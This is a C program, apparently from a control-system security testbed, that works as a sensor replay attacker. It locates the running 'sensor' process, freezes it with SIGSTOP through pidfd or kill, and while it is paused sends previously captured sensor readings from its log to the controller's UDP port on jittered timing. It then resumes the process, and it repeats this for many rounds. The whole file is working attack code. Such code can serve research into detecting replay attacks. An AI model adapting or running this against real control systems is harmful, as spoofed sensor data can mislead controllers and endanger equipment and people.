#include "common.h"

#ifndef __linux__
#include <stdio.h>
int main(void) {
    fprintf(stderr, "attacker_replay only supports Linux.\n");
    return 1;
}
#else

#include <arpa/inet.h>
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#if defined(__NR_pidfd_open)
#define SYS_PIDFD_OPEN __NR_pidfd_open
#elif defined(SYS_pidfd_open)
#define SYS_PIDFD_OPEN SYS_pidfd_open
#endif

#if defined(__NR_pidfd_send_signal)
#define SYS_PIDFD_SEND_SIGNAL __NR_pidfd_send_signal
#elif defined(SYS_pidfd_send_signal)
#define SYS_PIDFD_SEND_SIGNAL SYS_pidfd_send_signal
#endif

typedef struct {
    uint64_t seq;
    double value;
} replay_sample_t;

static volatile sig_atomic_t g_stop = 0;

static void on_sigint(int signo) {
    (void)signo;
    g_stop = 1;
}

static int is_number(const char *s) {
    if (!s || *s == '\0') {
        return 0;
    }
    if (*s == '+' || *s == '-') {
        s++;
    }
    if (*s == '\0') {
        return 0;
    }
    while (*s) {
        if (!isdigit((unsigned char)*s)) {
            return 0;
        }
        s++;
    }
    return 1;
}

static pid_t find_pid_by_comm(const char *proc_name) {
    DIR *dir = opendir("/proc");
    if (!dir) {
        return -1;
    }

    struct dirent *ent = NULL;
    while ((ent = readdir(dir)) != NULL) {
        if (!isdigit((unsigned char)ent->d_name[0])) {
            continue;
        }

        pid_t pid = (pid_t)atoi(ent->d_name);
        if (pid <= 0) {
            continue;
        }

        char comm_path[128];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *fp = fopen(comm_path, "r");
        if (!fp) {
            continue;
        }

        char comm[128];
        if (!fgets(comm, sizeof(comm), fp)) {
            fclose(fp);
            continue;
        }
        fclose(fp);

        size_t len = strlen(comm);
        if (len > 0 && comm[len - 1] == '\n') {
            comm[len - 1] = '\0';
        }

        if (strcmp(comm, proc_name) == 0) {
            closedir(dir);
            return pid;
        }
    }

    closedir(dir);
    errno = ESRCH;
    return -1;
}

static int pid_alive(pid_t pid) {
    if (pid <= 0) {
        return 0;
    }
    if (kill(pid, 0) == 0) {
        return 1;
    }
    return errno == EPERM;
}

static int64_t now_ms(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        return 0;
    }
    return (int64_t)ts.tv_sec * 1000LL + (int64_t)ts.tv_nsec / 1000000LL;
}

static int sleep_ms_interruptible(int ms) {
    if (ms <= 0) {
        return 0;
    }

    struct timespec req;
    req.tv_sec = ms / 1000;
    req.tv_nsec = (long)(ms % 1000) * 1000000L;

    while (!g_stop) {
        struct timespec rem = {0, 0};
        if (nanosleep(&req, &rem) == 0) {
            return 0;
        }
        if (errno != EINTR) {
            return -1;
        }
        req = rem;
    }
    return 0;
}

static int jittered_ms(int base_ms, int jitter_ms) {
    if (jitter_ms <= 0) {
        return base_ms;
    }
    int span = 2 * jitter_ms + 1;
    int delta = (rand() % span) - jitter_ms;
    int v = base_ms + delta;
    if (v < 1) {
        v = 1;
    }
    return v;
}

static int open_pidfd(pid_t pid) {
#if defined(SYS_PIDFD_OPEN)
    return (int)syscall(SYS_PIDFD_OPEN, pid, 0U);
#else
    (void)pid;
    errno = ENOSYS;
    return -1;
#endif
}

static int send_signal_pidfd(int pidfd, int sig) {
#if defined(SYS_PIDFD_SEND_SIGNAL)
    return (int)syscall(SYS_PIDFD_SEND_SIGNAL, pidfd, sig, NULL, 0U);
#else
    (void)pidfd;
    (void)sig;
    errno = ENOSYS;
    return -1;
#endif
}

static int send_target_signal(pid_t pid, int pidfd, int sig, const char **method_out) {
    if (pidfd >= 0) {
        if (send_signal_pidfd(pidfd, sig) == 0) {
            if (method_out) {
                *method_out = "pidfd_send_signal";
            }
            return 0;
        }
    }

    if (kill(pid, sig) == 0) {
        if (method_out) {
            *method_out = "kill";
        }
        return 0;
    }

    return -1;
}

static int parse_sensor_line(const char *line, uint64_t *seq_out, double *value_out) {
    unsigned long long seq = 0;
    double value = 0.0;

    if (sscanf(line, "[sensor] seq=%llu plant=%*lf measured=%lf", &seq, &value) == 2) {
        *seq_out = (uint64_t)seq;
        *value_out = value;
        return 0;
    }

    if (sscanf(line, "[sensor] seq=%llu value=%lf", &seq, &value) == 2) {
        *seq_out = (uint64_t)seq;
        *value_out = value;
        return 0;
    }

    return -1;
}

static int append_sample(replay_sample_t *samples, size_t *count, size_t max_count,
                         uint64_t seq, double value) {
    if (*count < max_count) {
        samples[*count].seq = seq;
        samples[*count].value = value;
        (*count)++;
        return 0;
    }

    if (max_count < 2) {
        return -1;
    }

    memmove(samples, samples + 1, (max_count - 1) * sizeof(samples[0]));
    samples[max_count - 1].seq = seq;
    samples[max_count - 1].value = value;
    return 0;
}

static int read_new_samples(FILE *fp, replay_sample_t *samples, size_t *count, size_t max_count,
                            uint64_t *last_seq_out) {
    int added = 0;
    char line[512];

    clearerr(fp);
    while (fgets(line, sizeof(line), fp) != NULL) {
        uint64_t seq = 0;
        double value = 0.0;
        if (parse_sensor_line(line, &seq, &value) == 0) {
            if (append_sample(samples, count, max_count, seq, value) == 0) {
                added++;
                if (last_seq_out) {
                    *last_seq_out = seq;
                }
            }
        }
    }

    return added;
}

static void usage(const char *prog) {
    fprintf(stderr,
            "Usage: %s <pid|auto|proc_name> <sensor_log_path> <hold_ms> [interval_ms] [rounds] [proc_name] [send_interval_ms] [capture_min] [replay_window] [jitter_ms]\n"
            "Example: %s auto ./logs/.../sensor.log 220 320 50 sensor 40 20 12 20\n",
            prog, prog);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        usage(argv[0]);
        return 1;
    }

    const char *target_spec = argv[1];
    const char *sensor_log_path = argv[2];
    int hold_ms = atoi(argv[3]);
    int interval_ms = 320;
    int rounds = 50;
    const char *proc_name = "sensor";
    int send_interval_ms = 40;
    int capture_min = 20;
    int replay_window = 12;
    int jitter_ms = 20;

    if (argc > 4) {
        interval_ms = atoi(argv[4]);
    }
    if (argc > 5) {
        rounds = atoi(argv[5]);
    }
    if (argc > 6) {
        proc_name = argv[6];
    }
    if (argc > 7) {
        send_interval_ms = atoi(argv[7]);
    }
    if (argc > 8) {
        capture_min = atoi(argv[8]);
    }
    if (argc > 9) {
        replay_window = atoi(argv[9]);
    }
    if (argc > 10) {
        jitter_ms = atoi(argv[10]);
    }

    if (hold_ms <= 0 || interval_ms <= 0 || rounds <= 0 || send_interval_ms <= 0 ||
        capture_min <= 0 || replay_window <= 0 || jitter_ms < 0) {
        usage(argv[0]);
        return 1;
    }

    if (!sensor_log_path || sensor_log_path[0] == '\0') {
        fprintf(stderr, "sensor_log_path must not be empty\n");
        return 1;
    }

    pid_t pid = -1;
    if (strcmp(target_spec, "auto") == 0) {
        pid = find_pid_by_comm(proc_name);
    } else if (is_number(target_spec)) {
        pid = (pid_t)strtol(target_spec, NULL, 10);
    } else {
        proc_name = target_spec;
        pid = find_pid_by_comm(proc_name);
    }

    if (pid <= 0) {
        perror("find target pid");
        fprintf(stderr, "Hint: ensure process name '%s' exists.\n", proc_name);
        return 1;
    }

    FILE *sensor_log_fp = fopen(sensor_log_path, "r");
    if (!sensor_log_fp) {
        perror("fopen(sensor_log_path)");
        return 1;
    }

    int send_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (send_sock < 0) {
        perror("socket(send_sock)");
        fclose(sensor_log_fp);
        return 1;
    }

    struct sockaddr_in controller_dst;
    memset(&controller_dst, 0, sizeof(controller_dst));
    controller_dst.sin_family = AF_INET;
    controller_dst.sin_port = htons(SENSOR_PORT);
    if (inet_pton(AF_INET, SENSOR_IP, &controller_dst.sin_addr) != 1) {
        fprintf(stderr, "inet_pton failed\n");
        close(send_sock);
        fclose(sensor_log_fp);
        return 1;
    }

    signal(SIGINT, on_sigint);
    signal(SIGTERM, on_sigint);
    srand((unsigned int)(time(NULL) ^ getpid()));

    int pidfd = open_pidfd(pid);
    if (pidfd >= 0) {
        printf("[replay_attacker] pidfd_open success pidfd=%d target_pid=%d\n", pidfd, pid);
    } else {
        printf("[replay_attacker] pidfd_open unavailable, fallback to kill(2): errno=%d\n", errno);
    }

    enum { MAX_CAPTURE = 4096 };
    replay_sample_t samples[MAX_CAPTURE];
    size_t sample_count = 0;
    uint64_t last_seq = 0;

    int wait_limit_ms = 20000;
    int waited_ms = 0;
    while (!g_stop && sample_count < (size_t)capture_min && waited_ms < wait_limit_ms) {
        (void)read_new_samples(sensor_log_fp, samples, &sample_count, MAX_CAPTURE, &last_seq);
        if (sample_count >= (size_t)capture_min) {
            break;
        }
        if (sleep_ms_interruptible(50) != 0) {
            perror("nanosleep(capture)");
            close(send_sock);
            fclose(sensor_log_fp);
            if (pidfd >= 0) {
                close(pidfd);
            }
            return 1;
        }
        waited_ms += 50;
    }

    if (sample_count == 0) {
        fprintf(stderr, "[replay_attacker] no sensor samples captured from log: %s\n", sensor_log_path);
        close(send_sock);
        fclose(sensor_log_fp);
        if (pidfd >= 0) {
            close(pidfd);
        }
        return 1;
    }

    size_t bank_len = (size_t)replay_window;
    if (bank_len > sample_count) {
        bank_len = sample_count;
    }
    if (bank_len == 0) {
        fprintf(stderr, "[replay_attacker] replay bank is empty\n");
        close(send_sock);
        fclose(sensor_log_fp);
        if (pidfd >= 0) {
            close(pidfd);
        }
        return 1;
    }

    printf("[replay_attacker] target_pid=%d proc_name=%s hold_ms=%d interval_ms=%d rounds=%d send_interval_ms=%d\n",
           pid, proc_name, hold_ms, interval_ms, rounds, send_interval_ms);
    printf("[replay_attacker] sensor_log=%s captured=%zu waited_ms=%d latest_seq=%llu\n",
           sensor_log_path, sample_count, waited_ms, (unsigned long long)last_seq);
    printf("[replay_attacker] replay_bank size=%zu seq_range=[%llu,%llu]\n",
           bank_len,
           (unsigned long long)samples[0].seq,
           (unsigned long long)samples[bank_len - 1].seq);

    int rounds_done = 0;
    int pauses = 0;
    int replay_packets = 0;
    int paused = 0;

    for (int i = 0; i < rounds && !g_stop; ++i) {
        (void)read_new_samples(sensor_log_fp, samples, &sample_count, MAX_CAPTURE, &last_seq);

        if (!pid_alive(pid)) {
            fprintf(stderr, "[replay_attacker] target pid %d not alive\n", pid);
            break;
        }

        int hold_this = jittered_ms(hold_ms, jitter_ms);
        int rest_this = jittered_ms(interval_ms, jitter_ms);

        const char *stop_method = "unknown";
        if (send_target_signal(pid, pidfd, SIGSTOP, &stop_method) != 0) {
            perror("send SIGSTOP");
            break;
        }
        paused = 1;

        int64_t t0_ms = now_ms();
        int pkt_round = 0;
        while (!g_stop) {
            int64_t now = now_ms();
            if (now - t0_ms >= hold_this) {
                break;
            }

            replay_sample_t s = samples[(size_t)pkt_round % bank_len];
            char out[128];
            int n = snprintf(out, sizeof(out), "%llu %.6f",
                             (unsigned long long)s.seq, s.value);
            if (n < 0 || n >= (int)sizeof(out)) {
                fprintf(stderr, "[replay_attacker] snprintf overflow\n");
                g_stop = 1;
                break;
            }

            if (sendto(send_sock, out, (size_t)n, 0,
                       (const struct sockaddr *)&controller_dst,
                       sizeof(controller_dst)) < 0) {
                perror("sendto(replay)");
                g_stop = 1;
                break;
            }

            printf("[replay_attacker] inject round=%d pkt=%d seq=%llu value=%.6f\n",
                   i, pkt_round,
                   (unsigned long long)s.seq,
                   s.value);
            fflush(stdout);

            pkt_round++;
            replay_packets++;

            if (sleep_ms_interruptible(send_interval_ms) != 0) {
                perror("nanosleep(send_interval)");
                g_stop = 1;
                break;
            }
        }

        const char *cont_method = "unknown";
        if (send_target_signal(pid, pidfd, SIGCONT, &cont_method) != 0) {
            perror("send SIGCONT");
            break;
        }
        paused = 0;

        int64_t t1_ms = now_ms();
        int64_t actual_hold_ms = (t1_ms >= t0_ms) ? (t1_ms - t0_ms) : (int64_t)hold_this;

        rounds_done++;
        pauses++;

        printf("[replay_attacker] round=%d stop_method=%s cont_method=%s hold_req_ms=%d hold_actual_ms=%lld rest_ms=%d replay_pkts=%d\n",
               i, stop_method, cont_method, hold_this, (long long)actual_hold_ms, rest_this, pkt_round);
        fflush(stdout);

        if (g_stop) {
            break;
        }
        if (sleep_ms_interruptible(rest_this) != 0) {
            perror("nanosleep(rest)");
            break;
        }
    }

    if (paused) {
        const char *resume_method = "unknown";
        if (send_target_signal(pid, pidfd, SIGCONT, &resume_method) == 0) {
            printf("[replay_attacker] cleanup resume target via %s\n", resume_method);
        } else {
            perror("cleanup SIGCONT");
        }
    }

    printf("[replay_attacker] summary rounds_done=%d pauses=%d replay_packets=%d captured=%zu bank=%zu\n",
           rounds_done, pauses, replay_packets, sample_count, bank_len);
    printf("[replay_attacker] finished.\n");

    if (pidfd >= 0) {
        close(pidfd);
    }
    close(send_sock);
    fclose(sensor_log_fp);
    return 0;
}

#endif
